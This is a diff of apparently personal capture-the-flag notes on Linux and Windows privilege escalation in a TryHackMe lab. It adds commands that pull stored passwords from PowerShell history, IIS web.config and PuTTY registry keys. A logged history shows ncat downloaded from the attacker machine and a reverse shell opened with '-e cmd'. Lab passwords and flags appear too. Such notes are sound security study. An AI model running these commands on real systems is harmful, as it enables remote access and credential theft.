@@ -1069,7 +1069,7 @@ karen@ip-10-10-2-24:/home/ubuntu/sharedfolder$ ./code
 ./code: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./code)
 > Return to this task Privilege Escalation via NFS 
 
-** RETRY on ATTACKBOX**  
+**RETRY on ATTACKBOX**  
 me=10.10.79.12
 target=10.10.2.24
 
@@ -1122,7 +1122,6 @@ dr-xr-xr-x. 18 root    root     235 Jun  7  2021 ..
 drwx------.  7 leonard leonard  197 Jun  7  2021 leonard
 drwx------. 16 missy   missy   4096 Jun  7  2021 missy
 drwx------.  2 root    root      23 Jun  7  2021 rootflag
-
 
 # tried crontab
 
@@ -1272,9 +1271,139 @@ THM-168824782390238
 
  
 ```
+---
+
+## WINDOWS PRIVILEGE ESCALATION 
+
+Windows User
+| Administrators |                             These users have the most privileges. They can change any system configuration parameter and access any file in the system.                             |
+|:--------------:|:-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------:|
+| Standard Users | These users can access the computer but only perform limited tasks. Typically these users can not make permanent or essential changes to the system and are limited to their files. |
+
+Windows Non User Account 
+| SYSTEM / LocalSystem | An account used by the operating system to perform internal tasks. It has full access to all files and resources available on the host with even higher privileges than administrators. |
+|:--------------------:|:---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------:|
+|     Local Service    |                               Default account used to run Windows services with "minimum" privileges. It will use anonymous connections over the network.                               |
+|    Network Service   |                    Default account used to run Windows services with "minimum" privileges. It will use the computer credentials to authenticate through the network.                    |
+
+
+## HARVESTING PASSWORDS FROM USUAL SPOTS 
+
+me=10.10.135.71
+target=10.10.154.247
 
 
 
+``
+root@ip-10-10-135-71:~/repo# xfreerdp /u:thm-unpriv /p:Password321 /cert:ignore /v:10.10.154.247
+connected to 10.10.154.247:3389
+``
+
+Powershell History
+> cmd : type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt  
+> powershell: type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+
+```
+PS C:\Windows\system32\sysprep> type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+ls
+whoami
+whoami /priv
+whoami /group
+whoami /groups
+cmdkey /?
+cmdkey /add:thmdc.local /user:julia.jones /pass:ZuperCkretPa5z
+cmdkey /list
+cmdkey /delete:thmdc.local
+cmdkey /list
+runas /?
+clear
+wgey
+wget
+wget 10.10.135.71:9999/ncat.exe
+ls
+ncat.exe 10.10.135.71 4444 -e cmd
+ls
+cd .\Documents\
+ls
+wget 10.10.135.71:9999/ncat.exe
+wget 10.10.135.71:9999/ncat.exe -o nc.exe
+ls
+nc 10.10.135.71 4444 -e cmd
+.\nc.exe 10.10.135.71 4444 -e cmd
+
+
+PS C:\Windows\system32\sysprep> cmdkey /list
+cmdkey /list
+
+Currently stored credentials:
+
+Target: Domain:interactive=WPRIVESC1\mike.katz
+Type: Domain Password
+User: WPRIVESC1\mike.katz
+
+
+# In this scenario I have to get back to the windows machine
+# I saw that it spawned a shell from mike.katz
+# type c:\Users\Desktop\flag.txt
+THM{WHAT_IS_MY_PASSWORD}
+
+```
+
+IIS Configuration
+Look at these ` type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString `
+
+
+``
+PS C:\Windows\system32\sysprep> type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+<add connectionStringName="LocalSqlServer" maxEventDetailsLength="1073741823" buffer="false" bufferMode="Notification" name="SqlWebEventProvider" type="System.Web.Management.SqlWebEventProvider,System.Web,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a" />
+<add connectionStringName="LocalSqlServer" name="AspNetSqlPersonalizationProvider" type="System.Web.UI.WebControls.WebParts.SqlPersonalizationProvider, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
+<connectionStrings>
+<add connectionString="Server=thm-db.local;Database=thm-sekure;User ID=db_admin;Password=098n0x35skjD3" name="THM-DB" />
+</connectionStrings>
+
+``
+
+**RETRIEVE CREDENTIALS FROM Software: Putty**
+``
+
+PS C:\Windows\system32\sysprep> reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+
+HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\My%20ssh%20server
+    ProxyExcludeList    REG_SZ
+    ProxyDNS    REG_DWORD    0x1
+    ProxyLocalhost    REG_DWORD    0x0
+    ProxyMethod    REG_DWORD    0x0
+    ProxyHost    REG_SZ    proxy
+    ProxyPort    REG_DWORD    0x50
+    ProxyUsername    REG_SZ    thom.smith
+    ProxyPassword    REG_SZ    CoolPass2021
+    ProxyTelnetCommand    REG_SZ    connect %host %port\n
+    ProxyLogToTerm    REG_DWORD    0x1
+
+End of search: 10 match(es) found.
+
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+---
 
 ## SUMMARY 
 
